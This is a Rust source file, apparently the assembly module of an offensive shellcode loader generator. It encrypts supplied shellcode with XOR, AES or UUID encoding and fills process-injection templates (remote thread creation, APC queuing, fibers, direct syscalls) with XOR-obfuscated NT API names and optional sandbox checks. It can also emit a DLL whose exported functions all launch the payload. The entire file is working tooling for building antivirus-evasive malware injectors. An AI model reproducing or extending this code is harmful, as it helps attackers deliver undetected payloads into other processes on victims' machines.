use crate::aes::encrypt_aes;
use crate::arg_parser::{Encryption, Execution, Format, Order};
use crate::sandbox::build_sandbox;
use crate::tools::{
    absolute_path, quoted_path, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
};
use crate::uuid_enc::encrypt_uuid;
use crate::xor::encrypt_xor;
use fs_extra::dir::{copy, CopyOptions};
use std::collections::HashMap;
use std::fs::{self, OpenOptions};
use std::io::prelude::*;
use std::path::{Path, PathBuf};
use std::process::exit;
use std::time::{SystemTime, UNIX_EPOCH};

fn obfuscate_api_name(name: &str, key: u8) -> String {
    let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
    format!("[{}]", bytes.join(", "))
}

fn non_zero_random_key() -> u8 {
    loop {
        let k = random_u8();
        if k != 0 {
            return k;
        }
    }
}

const OUTPUT_DIR: &str = "shared";

fn search_and_replace(
    path_to_file: &Path,
    search: &str,
    replace: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let file_content = fs::read_to_string(path_to_file)?;
    let new_content = file_content.replace(search, replace);

    let mut file = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(path_to_file)?;
    file.write_all(new_content.as_bytes())?;

    Ok(())
}

fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
    let folder_name = format!("output_{}", timestamp);
    println!("[+] Creating output folder: {}", &folder_name);

    let result_path = parent.join(folder_name);
    fs::create_dir(&result_path)?;

    Ok(result_path)
}

fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let options = CopyOptions {
        content_only: true,
        ..Default::default()
    };
    copy(source, dest, &options)?;

    Ok(())
}

fn template_path_for_execution(execution: &Execution) -> &'static Path {
    match execution {
        Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
        Execution::NtCreateRemoteThread => Path::new("templates/ntCRT/."),
        Execution::SysCreateRemoteThread => Path::new("templates/sysCRT/."),
        Execution::WinCreateRemoteThread => Path::new("templates/winCRT/."),
        Execution::WinFiber => Path::new("templates/winFIBER/."),
        Execution::NtFiber => Path::new("templates/ntFIBER/."),
        Execution::SysFiber => Path::new("templates/sysFIBER/."),
    }
}

fn build_encrypted_output(
    order: &Order,
    src_dir: &Path,
) -> (EncryptionOutput, String) {
    match order.encryption {
        Encryption::Xor => {
            let path = src_dir.join("input.xor");
            let abs = absolute_path(&path).expect("Invalid XOR output path");
            let output = encrypt_xor(&order.shellcode_path, &path, random_u8());
            (output, quoted_path(&abs))
        }
        Encryption::Aes => {
            let path = src_dir.join("input.aes");
            let abs = absolute_path(&path).expect("Invalid AES output path");
            let output = encrypt_aes(&order.shellcode_path, &path, &random_aes_key(), &random_aes_iv());
            (output, quoted_path(&abs))
        }
        Encryption::Uuid => {
            let path = src_dir.join("input.uuid");
            let abs = absolute_path(&path).expect("Invalid UUID output path");
            let output = encrypt_uuid(&order.shellcode_path, &path);
            (output, quoted_path(&abs))
        }
    }
}

fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
    let shellcode_abs = absolute_path(&order.shellcode_path).expect("Invalid shellcode path");

    let mut replacements: HashMap<&'static str, String> = HashMap::new();
    replacements.insert("{{DEPENDENCIES}}", String::new());
    replacements.insert("{{IMPORTS}}", String::new());
    replacements.insert("{{DECRYPTION_FUNCTION}}", String::new());
    replacements.insert("{{MAIN}}", String::new());
    replacements.insert("{{PATH_TO_SHELLCODE}}", quoted_path(&shellcode_abs));
    replacements.insert("{{DLL_MAIN}}", String::new());
    replacements.insert("{{DLL_FORMAT}}", String::new());
    replacements.insert("{{TARGET_PROCESS}}", order.target_process.clone());
    replacements.insert("{{SANDBOX}}", String::new());
    replacements.insert("{{SANDBOX_IMPORTS}}", String::new());

    let (enc_output, shellcode_path_str) = build_encrypted_output(order, src_dir);
    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
    replacements.insert("{{MAIN}}", enc_output.main);
    replacements.insert("{{PATH_TO_SHELLCODE}}", shellcode_path_str);
    if let Some(deps) = enc_output.dependencies {
        replacements.insert("{{DEPENDENCIES}}", deps);
    }
    if let Some(imports) = enc_output.imports {
        replacements.insert("{{IMPORTS}}", imports);
    }

    if let Some(ref domain) = order.sandbox {
        let sandbox_output = build_sandbox(domain);
        replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
        replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
    }

    let api_key = non_zero_random_key();
    replacements.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
    replacements.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", api_key));
    replacements.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", api_key));
    replacements.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", api_key));
    replacements.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", api_key));
    replacements.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", api_key));
    replacements.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", api_key));
    replacements.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", api_key));

    replacements
}

fn apply_dll_format(
    replacements: &mut HashMap<&'static str, String>,
    main_rs_path: &Path,
) -> PathBuf {
    let dll_cargo_conf = r#"
    [lib]
    crate-type = ["cdylib"]"#;
    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());

    let dll_main_fn = r#"
    #[no_mangle]
    #[allow(non_snake_case, unused_variables, unreachable_patterns)]
    extern "system" fn DllMain(
        dll_module: u32,
        call_reason: u32,
        _: *mut ())
        -> bool
    {
        match call_reason {
            DLL_PROCESS_ATTACH => (),
            DLL_PROCESS_DETACH => (),
            _ => ()
        }

        true
    }
    #[no_mangle]
    pub extern "C" fn DllRegisterServer() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn DllGetClassObject() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn DllUnregisterServer() {{
        main()
    }}
    #[no_mangle]
    pub extern "C" fn Run() {{
        main()
    }}
    "#;
    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());

    let lib_rs_path = main_rs_path.with_file_name("lib.rs");
    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
        eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
        exit(1);
    }

    lib_rs_path
}

fn apply_replacements(
    replacements: &HashMap<&str, String>,
    main_path: &Path,
    cargo_path: &Path,
) {
    for (key, value) in replacements {
        search_and_replace(main_path, key, value)
            .unwrap_or_else(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
        search_and_replace(cargo_path, key, value)
            .unwrap_or_else(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
    }
}

pub fn assemble(order: Order) -> PathBuf {
    println!("[+] Assembling Rust code..");

    let template_path = template_path_for_execution(&order.execution);
    let folder = create_root_folder(Path::new(OUTPUT_DIR))
        .expect("Failed to create output folder");
    copy_template(template_path, &folder).expect("Failed to copy template");

    let src_dir = folder.join("src");
    let main_rs = src_dir.join("main.rs");
    let cargo_toml = folder.join("Cargo.toml");

    let mut replacements = build_replacements(&order, &src_dir);

    let target_file = match order.format {
        Format::Dll => apply_dll_format(&mut replacements, &main_rs),
        Format::Exe => main_rs,
    };

    apply_replacements(&replacements, &target_file, &cargo_toml);

    println!("[+] Done assembling Rust code!");
    folder
}
